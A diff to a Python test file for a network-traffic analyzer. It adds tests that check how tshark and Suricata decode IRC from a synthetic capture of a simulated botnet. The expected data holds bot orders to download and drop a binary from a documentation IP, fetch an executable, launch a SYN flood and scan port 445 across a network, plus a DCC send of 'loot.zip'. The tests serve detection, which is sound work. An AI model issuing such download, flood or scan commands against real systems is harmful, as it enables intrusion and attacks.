@@ -1009,6 +1009,81 @@ class TestZabbix(unittest.TestCase):
 
 
 @unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestIRC(unittest.TestCase):
+    """tests/protocol_fixtures.write_irc_pcap: one record per IRC
+    connection - with what Suricata 8.0.8 logged for the capture
+    (tests/data/irc_fixture.eve.json): the three connections that open
+    with PASS it took for FTP, logging FTP records of their IRC."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_irc_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'irc.pcap')
+        write_irc_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.irc = {r['src_port']: r['irc'] for r in cls.records if r['event_type'] == 'irc'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_logins(self):
+        self.assertEqual({k: self.irc[43400].get(k) for k in ('login', 'password', 'nick', 'closed')},
+                         {'login': 'failed', 'password': 'wrongpw', 'nick': 'lurker',
+                          'closed': 'Closing connection: lurker[~lurker@10.1.0.10] (Access denied: Bad password?)'})
+        bot = self.irc[43402]
+        self.assertEqual({k: bot.get(k) for k in ('login', 'nick', 'nicks', 'server', 'network', 'server_version',
+                                                  'channels', 'channel_keys', 'services_password', 'bot_like_nick',
+                                                  'errors')},
+                         {'login': 'registered', 'nick': 'USA|83621', 'nicks': ['herder', 'USA|83621'],
+                          'server': 'irc.evilnet.example', 'network': 'EvilNet', 'server_version': 'ngircd-27',
+                          'channels': ['#ddos'], 'channel_keys': {'#ddos': 's3cr3tkey'}, 'services_password': 'botpass',
+                          'bot_like_nick': True,
+                          'errors': {'433': 'Nickname already in use', '475': 'Cannot join channel (+k) -- Wrong channel key'}})
+        self.assertEqual(self.irc[43401]['oper'], {'name': 'admin', 'password': 'wrongoper', 'result': 'failed: Invalid password'})
+        self.assertNotIn('bot_like_nick', self.irc[43401])
+
+    def test_orders_messages_and_transfers(self):
+        bot = self.irc[43402]
+        self.assertEqual(bot['bot_commands'], ['!download http://198.51.100.66/bins/x86 /tmp/.x',
+                                               '!ddos.syn 203.0.113.50 80 120', '.scan 445 10.0.0.0/8'])
+        self.assertEqual(bot['topics'], {'#ddos': '!download http://198.51.100.66/bins/x86 /tmp/.x'})
+        self.assertEqual((bot['messages_sent'], bot['messages_received']), (4, 3))
+        self.assertEqual(bot['messages'][-1], {'direction': 'sent', 'from': 'USA|83621', 'to': 'NickServ',
+                                               'text': 'IDENTIFY ***'})
+        self.assertEqual(bot['ctcp'], ['received: VERSION', 'sent: VERSION mIRC v6.17 Khaled Mardam-Bey'])
+        self.assertEqual(bot['dcc'], [{'file': 'loot.zip', 'address': '198.51.100.66:5050', 'direction': 'sent',
+                                       'from': 'USA|83621', 'to': 'herder', 'size': 48213}])
+
+    def test_the_irc_port_range_and_a_split_line(self):
+        """Port 6669 decodes as IRC too; a welcome split across segments is
+        read whole."""
+        other = self.irc[43403]
+        self.assertEqual((other['nick'], other['login'], other['server'], other['bot_commands']),
+                         ('[DEU|W10]48213', 'registered', 'irc.alt.example', ['.update http://203.0.113.9/w.exe']))
+
+    def test_the_merge_keeps_irc_suricata_took_for_ftp(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('irc_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['named_by_tshark']), (1, 1))
+        self.assertEqual([d['fields'] for d in report['differences']], [{'app_proto': ('ftp', 'irc')}] * 3)
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'irc_fixture.eve.json'))
+        self.assertEqual({app for spans in db.suricata_identified_flows(events_db).values() for *_, app in spans},
+                         {'ftp'})
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'irc.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual(counts.get('irc'), 4)
+        self.assertNotIn('conn_irc', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
 class TestECAT(unittest.TestCase):
     """tests/protocol_fixtures.write_ecat_pcap: one record per EtherCAT
     master - with what Suricata 8.0.8 logged for the capture
@@ -3834,6 +3909,14 @@ class TestMergeRows(unittest.TestCase):
                                      _row('dns'), _row('http'), _row('smb'), _row('ftp_data'), _row('mdns')]),
                          [('s7comm', None), ('nbns', None), ('llmnr', None), ('ssdp', None)])
 
+    def test_a_protocol_suricata_misreads_keeps_its_records(self):
+        """IRC that opens with PASS is FTP to Suricata: its label doesn't
+        keep IRC's records out - only another protocol's."""
+        identified = {'1:irc': [(1767225600.0, 1767225620.0, 'ftp')], '1:http': [(1767225600.0, 1767225620.0, 'http')]}
+        rows = [_row('irc', cid='1:irc'), _row('irc', cid='1:http'), _row('telnet', cid='1:irc')]
+        self.assertEqual([(e['event_type'], e['community_id']) for e in shark_analyzer.merge_rows(rows, identified)],
+                         [('irc', '1:irc')])
+
     def test_tls_failures_stay_on_flows_suricata_identified_with_its_certificate(self):
         """Suricata logs no TLS alerts, so its word on the flow doesn't
         stand in for them - and its tls record of the connection, the
@@ -4248,11 +4331,11 @@ class TestSharkAPI(unittest.TestCase):
         self.assertIn(body['status'], ('queued', 'running', 'ready'))
         body = self._wait_ready()
         self.assertIsInstance(body.pop('seconds'), int)
-        self.assertEqual(sorted(body.pop('types')), ['conn_irc', 'llmnr', 'nbns', 'ssdp'],
-                         'what tshark added: the chatter records and the IRC connection row, which the page reloads its cards for')
+        self.assertEqual(sorted(body.pop('types')), ['irc', 'llmnr', 'nbns', 'ssdp'],
+                         "what tshark added: the chatter's and IRC's records, which the page reloads its cards for")
         self.assertEqual(body, {'status': 'ready', 'merged': True})
         _, stats = self._get(f'/api/stats?md5={self.md5}')
-        self.assertEqual(sorted(stats['tshark_types']), ['conn_irc', 'llmnr', 'nbns', 'ssdp'],
+        self.assertEqual(sorted(stats['tshark_types']), ['irc', 'llmnr', 'nbns', 'ssdp'],
                          'the protocols here Suricata lacks - the stats say which')
 
     def test_waits_for_suricata(self):
